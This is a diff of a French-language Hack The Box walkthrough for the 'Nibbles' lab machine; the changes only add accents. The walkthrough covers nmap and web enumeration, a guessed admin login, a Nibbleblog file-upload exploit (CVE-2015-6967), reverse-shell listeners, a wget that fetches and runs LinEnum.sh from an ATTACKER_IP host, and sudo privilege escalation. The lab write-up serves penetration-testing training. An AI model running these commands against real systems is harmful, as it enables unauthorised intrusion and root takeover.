@@ -1,10 +1,10 @@
 # Walkthrough : Nibbles
 
-[<< Precedent : Transfert de fichiers](07-transfert-de-fichiers.md) | [Retour au sommaire](README.md)
+[<< Précédent : Transfert de fichiers](07-transfert-de-fichiers.md) | [Retour au sommaire](README.md)
 
 ---
 
-Box Linux easy - illustre le processus complet : enumeration, exploitation web, et privilege escalation.
+Box Linux easy - illustre le processus complet : énumération, exploitation web, et privilege escalation.
 
 > Box HTB : https://app.hackthebox.com/machines/Nibbles
 > Walkthrough 0xdf : https://0xdf.gitlab.io/2018/06/30/htb-nibbles.html
@@ -12,17 +12,17 @@ Box Linux easy - illustre le processus complet : enumeration, exploitation web, 
 
 ---
 
-## Phase 1 : Enumeration reseau
+## Phase 1 : Énumération réseau
 
 ```bash
 nmap -sV --open -oA nibbles_initial 10.129.42.190
-# Resultat : port 22 (SSH OpenSSH 7.2p2) et port 80 (Apache)
+# Résultat : port 22 (SSH OpenSSH 7.2p2) et port 80 (Apache)
 
 nmap -sC -p 22,80 -oA nibbles_scripts 10.129.42.190
-# Scripts par defaut sur les ports ouverts
+# Scripts par défaut sur les ports ouverts
 
 nmap -p- --open -oA nibbles_full 10.129.42.190
-# Scan complet en arriere-plan - pas de port supplementaire
+# Scan complet en arrière-plan - pas de port supplémentaire
 ```
 
 Banner grabbing avec netcat pour confirmer :
@@ -34,32 +34,32 @@ nc -nv 10.129.42.190 22
 
 ---
 
-## Phase 2 : Enumeration web
+## Phase 2 : Énumération web
 
 ```bash
-# Page d'accueil - rien d'interessant en apparence
+# Page d'accueil - rien d'intéressant en apparence
 curl http://10.129.42.190
 # -> <b>Hello world!</b>
 # -> <!-- /nibbleblog/ directory. Nothing interesting here! -->
-# Le commentaire HTML revele un repertoire cache !
+# Le commentaire HTML révèle un répertoire caché !
 
-# Fingerprinting du repertoire decouvert
+# Fingerprinting du répertoire découvert
 whatweb http://10.129.42.190/nibbleblog
 # -> Nibbleblog, PHP, jQuery, Apache 2.4.18
 
 # Directory brute-forcing
 gobuster dir -u http://10.129.42.190/nibbleblog/ -w /usr/share/seclists/Discovery/Web-Content/common.txt
-# Resultats cles : /admin.php (200), /content (301), /README (200)
+# Résultats clés : /admin.php (200), /content (301), /README (200)
 ```
 
-**Decouverte de la version :**
+**Découverte de la version :**
 
 ```bash
 curl http://10.129.42.190/nibbleblog/README
-# -> Version: v4.0.3 - vulnerable a une faille d'upload authentifiee
+# -> Version: v4.0.3 - vulnérable à une faille d'upload authentifiée
 ```
 
-**Enumeration des fichiers exposes (directory listing active) :**
+**Énumération des fichiers exposés (directory listing activé) :**
 
 ```bash
 # Confirmation du username
@@ -73,16 +73,16 @@ curl -s http://10.129.42.190/nibbleblog/content/private/config.xml | xmllint --f
 ```
 
 **Identification du mot de passe :**
-- Pas de mot de passe par defaut connu pour Nibbleblog
-- Protection anti brute-force (blacklist IP apres trop de tentatives)
+- Pas de mot de passe par défaut connu pour Nibbleblog
+- Protection anti brute-force (blacklist IP après trop de tentatives)
 - Indices contextuels : le nom de la box, le titre du site, l'email - tout pointe vers `nibbles`
-- Login reussi avec `admin:nibbles`
+- Login réussi avec `admin:nibbles`
 
 ---
 
 ## Phase 3 : Foothold (initial access)
 
-Exploitation de la vulnerabilite **Nibbleblog File Upload** (CVE-2015-6967) via le plugin "My image" :
+Exploitation de la vulnérabilité **Nibbleblog File Upload** (CVE-2015-6967) via le plugin "My image" :
 
 ```bash
 # 1) Upload d'un fichier PHP via le plugin My Image dans /admin.php
@@ -91,7 +91,7 @@ Exploitation de la vulnerabilite **Nibbleblog File Upload** (CVE-2015-6967) via 
 # 2) Listener sur notre machine
 nc -lvnp 9443
 
-# 3) Declencher l'execution
+# 3) Déclencher l'exécution
 curl http://10.129.42.190/nibbleblog/content/private/plugins/my_image/image.php
 
 # 4) Upgrade TTY
@@ -99,17 +99,17 @@ python3 -c 'import pty; pty.spawn("/bin/bash")'
 # Ctrl+Z -> stty raw -echo -> fg -> Enter x2
 ```
 
-Le fichier uploade est stocke dans `/nibbleblog/content/private/plugins/my_image/image.php` - le chemin est previsible grace au directory listing.
+Le fichier uploadé est stocké dans `/nibbleblog/content/private/plugins/my_image/image.php` - le chemin est prévisible grâce au directory listing.
 
 ---
 
 ## Phase 4 : Privilege Escalation
 
 ```bash
-# Enumeration automatisee
+# Énumération automatisée
 wget http://ATTACKER_IP:8080/LinEnum.sh && chmod +x LinEnum.sh && ./LinEnum.sh
 
-# Decouverte critique : sudo sans mot de passe
+# Découverte critique : sudo sans mot de passe
 sudo -l
 # -> (root) NOPASSWD: /home/nibbler/personal/stuff/monitor.sh
 
@@ -128,17 +128,17 @@ nc -lvnp 8443
 # -> uid=0(root) gid=0(root) groups=0(root)
 ```
 
-**Lecon cle** : un fichier writeable execute avec `sudo` = escalade de privileges triviale. Toujours verifier les permissions des fichiers references dans `sudo -l`.
+**Leçon clé** : un fichier writeable exécuté avec `sudo` = escalade de privilèges triviale. Toujours vérifier les permissions des fichiers référencés dans `sudo -l`.
 
 ---
 
-## Resume de la methodologie
+## Résumé de la méthodologie
 
 ```
 nmap (ports ouverts)
-  -> curl + code source (repertoire cache /nibbleblog/)
-    -> whatweb + gobuster (technos + fichiers exposes)
-      -> README (version vulnerable 4.0.3)
+  -> curl + code source (répertoire caché /nibbleblog/)
+    -> whatweb + gobuster (technos + fichiers exposés)
+      -> README (version vulnérable 4.0.3)
       -> users.xml (username: admin)
       -> config.xml (indices pour le password: nibbles)
         -> admin.php login (admin:nibbles)
